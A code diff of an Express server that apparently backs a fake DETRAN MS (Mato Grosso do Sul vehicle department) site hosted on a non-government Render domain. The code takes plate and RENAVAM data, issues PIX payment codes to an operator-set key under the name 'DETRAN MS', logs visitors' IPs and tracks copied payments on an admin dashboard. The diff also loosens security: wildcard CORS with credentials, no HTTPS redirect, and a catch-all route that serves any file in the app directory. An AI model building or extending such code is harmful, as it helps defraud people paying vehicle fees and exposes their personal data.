@@ -1,36 +1,27 @@
 const express = require('express');
 const axios = require('axios');
-const cors = require('cors');
 const fs = require('fs').promises;
 const path = require('path');
 
 const app = express();
-app.use(express.json());
 
 // ============================================
-// CORS CONFIGURADO PARA PRODUÇÃO
+// CORS MANUAL - FUNCIONA SEMPRE
 // ============================================
-const corsOptions = {
-    origin: '*',
-    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
-    credentials: true,
-    optionsSuccessStatus: 200
-};
-
-app.use(cors(corsOptions));
-app.options('*', cors(corsOptions));
-
-// Forçar HTTPS no Render
 app.use((req, res, next) => {
-    if (req.headers['x-forwarded-proto'] && 
-        req.headers['x-forwarded-proto'] !== 'https' &&
-        process.env.NODE_ENV === 'production') {
-        return res.redirect(`https://${req.headers.host}${req.url}`);
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+    res.header('Access-Control-Allow-Credentials', 'true');
+    
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
     }
+    
     next();
 });
 
+app.use(express.json());
 app.use(express.static('.'));
 
 // ============================================
@@ -136,14 +127,6 @@ app.post('/api/online/saiu', (req, res) => {
     } catch (error) {
         res.status(500).json({ sucesso: false });
     }
-});
-
-// ============================================
-// LOG DE REQUISIÇÕES
-// ============================================
-app.use((req, res, next) => {
-    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Origin: ${req.headers.origin || 'N/A'} - IP: ${req.ip}`);
-    next();
 });
 
 // ============================================
@@ -274,7 +257,7 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // ============================================
-// REGISTRAR PIX COPIADO (CORRIGIDO)
+// REGISTRAR PIX COPIADO
 // ============================================
 app.post('/api/registrar-pix-copiado', async (req, res) => {
     try {
@@ -402,7 +385,7 @@ app.post('/api/admin/buscar-pix', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// CALCULAR CRC16 PARA PIX (CORRIGIDO)
+// CALCULAR CRC16 PARA PIX
 // ============================================
 function calcularCRC16(payload) {
     let crc = 0xFFFF;
@@ -427,18 +410,15 @@ function calcularCRC16(payload) {
 }
 
 // ============================================
-// GERAR CÓDIGO PIX REAL (IDÊNTICO AO gerarpix.com.br)
+// GERAR CÓDIGO PIX REAL
 // ============================================
 function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
-    // VALIDAÇÕES BÁSICAS
     if (!chavePix || chavePix.trim() === '') {
         throw new Error('Chave PIX não configurada');
     }
     
-    // Mantém chave EXATAMENTE como o usuário digitou (com pontos/traços)
     const chaveOriginal = chavePix.trim();
     
-    // Validações básicas
     if (chaveOriginal.length < 11) {
         throw new Error('Chave PIX muito curta (mínimo 11 caracteres)');
     }
@@ -447,49 +427,39 @@ function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
         throw new Error('Chave PIX muito longa (máximo 77 caracteres)');
     }
     
-    // Preenche textos (igual gerarpix.com.br faz)
     nomeRecebedor = (nomeRecebedor || 'DETRAN MS').substring(0, 25);
     cidade = (cidade || 'CAMPO GRANDE').substring(0, 15);
-    
-    // TxId (identificador) - igual gerarpix.com.br
     const txId = (identificador || 'PAGAMENTODETRAN').substring(0, 20);
-    
-    // Valor com 2 casas decimais
     const valorStr = parseFloat(valor).toFixed(2);
     
-    // ========================================
-    // CONSTRUÇÃO IDÊNTICA AO gerarpix.com.br
-    // ========================================
-    
-    // 1. Payload Format Indicator
+    // Construção do payload
     let payload = '000201';
     
-    // 2. Merchant Account Information
-    // Formato: 26 + tamanho + '0014BR.GOV.BCB.PIX' + '01' + tamanhoChave + chave
+    // Merchant Account Information
     const pixStatic = '0014BR.GOV.BCB.PIX';
     const chaveComTamanho = '01' + chaveOriginal.length.toString().padStart(2, '0') + chaveOriginal;
     const merchantInfo = pixStatic + chaveComTamanho;
     payload += '26' + merchantInfo.length.toString().padStart(2, '0') + merchantInfo;
     
-    // 3. Merchant Category Code (0000 = Outros)
+    // Merchant Category Code
     payload += '52040000';
     
-    // 4. Transaction Currency (BRL = 986)
+    // Transaction Currency
     payload += '5303986';
     
-    // 5. Transaction Amount
+    // Transaction Amount
     payload += '54' + valorStr.length.toString().padStart(2, '0') + valorStr;
     
-    // 6. Country Code
+    // Country Code
     payload += '5802BR';
     
-    // 7. Merchant Name
+    // Merchant Name
     payload += '59' + nomeRecebedor.length.toString().padStart(2, '0') + nomeRecebedor;
     
-    // 8. Merchant City
+    // Merchant City
     payload += '60' + cidade.length.toString().padStart(2, '0') + cidade;
     
-    // 9. Additional Data Field (TxId) - OPCIONAL mas o gerarpix.com.br inclui
+    // Additional Data Field
     if (txId && txId.length > 0) {
         const additionalData = '05' + txId.length.toString().padStart(2, '0') + txId;
         payload += '62' + additionalData.length.toString().padStart(2, '0') + additionalData;
@@ -506,45 +476,14 @@ function gerarCodigoPIX(chavePix, valor, nomeRecebedor, cidade, identificador) {
 }
 
 // ============================================
-// VALIDAR PIX (TESTE RÁPIDO)
-// ============================================
-function testarGeracaoPIX() {
-    try {
-        // Teste com chave CPF (exemplo)
-        const pixCode = gerarCodigoPIX(
-            '068.542.791-94',  // CPF com pontos/traço
-            100.00,
-            'detran ms',
-            'mato grosso',
-            'pagamentodetran'
-        );
-        
-        console.log('🧪 TESTE PIX GERADO:');
-        console.log('Tamanho:', pixCode.length);
-        console.log('CRC:', pixCode.slice(-4));
-        console.log('Primeiros 50:', pixCode.substring(0, 50));
-        
-        return pixCode;
-        
-    } catch (error) {
-        console.error('❌ Erro no teste PIX:', error.message);
-        return null;
-    }
-}
-
-// Executa teste ao iniciar
-console.log('🧪 Testando geração de PIX...');
-testarGeracaoPIX();
-
-// ============================================
-// API PARA GERAR PIX COM CHAVE DO PAINEL (ATUALIZADA)
+// API PARA GERAR PIX COM CHAVE DO PAINEL
 // ============================================
 app.post('/api/gerar-pix', async (req, res) => {
     try {
         const { valor, placa, renavam, tipo, descricao } = req.body;
         const ip = req.ip.replace('::ffff:', '') || req.connection.remoteAddress;
         
-        // Carrega configurações COMPLETAS
+        // Carrega configurações
         const config = await readData('config.json');
         
         // VERIFICA SE TEM CHAVE PIX CADASTRADA
@@ -564,7 +503,7 @@ app.post('/api/gerar-pix', async (req, res) => {
             });
         }
         
-        // Gera código PIX USANDO NOVA FUNÇÃO
+        // Gera código PIX
         const codigoPix = gerarCodigoPIX(
             config.chavePix, 
             valorNum, 
@@ -573,10 +512,9 @@ app.post('/api/gerar-pix', async (req, res) => {
             config.pixIdentificador || 'PAGAMENTODETRAN'
         );
         
-        // DEBUG: Log do PIX gerado
+        // DEBUG
         console.log('📱 PIX GERADO COM SUCESSO:', {
             tamanho: codigoPix.length,
-            ultimos10: codigoPix.slice(-10),
             crc: codigoPix.slice(-4),
             placa: placa,
             valor: valorNum
@@ -596,7 +534,7 @@ app.post('/api/gerar-pix', async (req, res) => {
             dataHora: new Date().toISOString(),
             ip: ip,
             status: 'pendente',
-            codigoPix: codigoPix.substring(0, 80) // Mostra só início
+            codigoPix: codigoPix.substring(0, 80)
         });
         
         await writeData('pix.json', pixData);
@@ -717,11 +655,11 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
         
         usuariosOnline.forEach((usuario, ip) => {
             const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
-            if (segundosInativo <= 1800) { // 30 minutos
+            if (segundosInativo <= 1800) {
                 usuariosAtivos.push({
                     ...usuario,
                     segundosInativo,
-                    status: segundosInativo > 300 ? 'inativo' : 'ativo' // 5 minutos
+                    status: segundosInativo > 300 ? 'inativo' : 'ativo'
                 });
             }
         });
@@ -758,24 +696,6 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
             new Date(p.dataHora).toDateString() === hoje
         ).length;
         
-        // Atividade por hora (últimas 24h)
-        const atividadePorHora = {};
-        const agora24h = new Date(agora - 24 * 60 * 60 * 1000);
-        
-        pix.forEach(p => {
-            const hora = new Date(p.dataHora).getHours();
-            if (new Date(p.dataHora) >= agora24h) {
-                atividadePorHora[hora] = (atividadePorHora[hora] || 0) + 1;
-            }
-        });
-        
-        // Preenche horas sem atividade
-        for (let i = 0; i < 24; i++) {
-            if (!atividadePorHora[i]) {
-                atividadePorHora[i] = 0;
-            }
-        }
-        
         res.json({
             sucesso: true,
             dados: {
@@ -792,10 +712,9 @@ app.get('/api/admin/dashboard', autenticarAdmin, async (req, res) => {
                     valorReais: `R$ ${valorReais.toFixed(2)}`,
                     valorTotal: `R$ ${valorTotal.toFixed(2)}`
                 },
-                consultasCompletas: consultas.slice(-50).reverse(), // Últimas 50
-                pixCompletos: pix.slice(-50).reverse(), // Últimas 50
+                consultasCompletas: consultas.slice(-50).reverse(),
+                pixCompletos: pix.slice(-50).reverse(),
                 usuariosOnline: usuariosAtivos,
-                atividadePorHora: atividadePorHora,
                 sistema: {
                     versao: '2.5.0',
                     inicioOperacao: new Date().toLocaleDateString('pt-BR'),
@@ -915,7 +834,7 @@ setInterval(() => {
     
     usuariosOnline.forEach((usuario, ip) => {
         const segundosInativo = Math.floor((agora - usuario.ultimaAtividade) / 1000);
-        if (segundosInativo > 1800) { // 30 MINUTOS
+        if (segundosInativo > 1800) {
             usuariosOnline.delete(ip);
             removidos++;
         }
@@ -924,7 +843,7 @@ setInterval(() => {
     if (removidos > 0) {
         console.log(`🧹 Limpou ${removidos} usuários inativos (30+ minutos)`);
     }
-}, 60000); // Verifica a cada 1 minuto
+}, 60000);
 
 // ============================================
 // LIMPEZA AUTOMÁTICA DE DADOS ANTIGOS
@@ -965,7 +884,40 @@ setInterval(async () => {
     } catch (error) {
         console.error('Erro na limpeza automática:', error);
     }
-}, 3600000); // A cada 1 hora
+}, 3600000);
+
+// ============================================
+// ROTA DE SAÚDE
+// ============================================
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'OK', 
+        service: 'DETRAN MS',
+        version: '2.5.0',
+        timestamp: new Date().toISOString(),
+        online: usuariosOnline.size
+    });
+});
+
+// ============================================
+// ROTA PADRÃO PARA ARQUIVOS ESTÁTICOS
+// ============================================
+app.get('*', (req, res) => {
+    const filePath = path.join(__dirname, req.path);
+    
+    // Se for a raiz, serve index.html
+    if (req.path === '/' || req.path === '') {
+        return res.sendFile(path.join(__dirname, 'index.html'));
+    }
+    
+    // Tenta servir o arquivo solicitado
+    res.sendFile(filePath, (err) => {
+        if (err) {
+            // Se não encontrar, redireciona para index.html
+            res.sendFile(path.join(__dirname, 'index.html'));
+        }
+    });
+});
 
 // ============================================
 // INICIA O SERVIDOR
@@ -974,7 +926,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log('============================================');
     console.log('✅ Servidor DETRAN MS rodando na porta: ' + PORT);
-    console.log('🌐 Acesse via: https://gov-detranms.onrender.com');
+    console.log('🌐 Acesse: https://gov-detranms.onrender.com');
     console.log('👨‍💼 Painel Admin: /painel.html');
     console.log('📊 Dados salvos em: /data/');
     console.log('⏰ Timer PIX: 15 minutos');
